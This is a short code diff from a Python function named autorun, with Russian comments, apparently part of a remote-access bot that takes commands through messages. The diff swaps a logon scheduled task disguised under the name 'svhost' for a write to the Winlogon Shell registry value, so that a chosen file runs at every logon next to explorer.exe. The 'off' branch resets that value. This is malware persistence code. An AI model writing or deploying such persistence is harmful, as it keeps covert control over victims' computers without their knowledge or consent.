@@ -943,7 +943,7 @@ def autorun(message):
                     return
 
                 # Создаем команду без сложного экранирования
-                command = (f'schtasks /Create /TN svhost /TR {final_path} /SC ONLOGON /F')
+                command = (f'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, {final_path}" /f')
 
                 try:
                     # Выполняем команду с отдельными аргументами
@@ -966,7 +966,7 @@ def autorun(message):
                 
             elif on_off == "off":
                 # Удаляем задачу из планировщика
-                command = f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c schtasks /Delete /TN svhost /F\'"'
+                command = f'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f'
                 
                 result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT,
                                             universal_newlines=True, encoding='cp866')
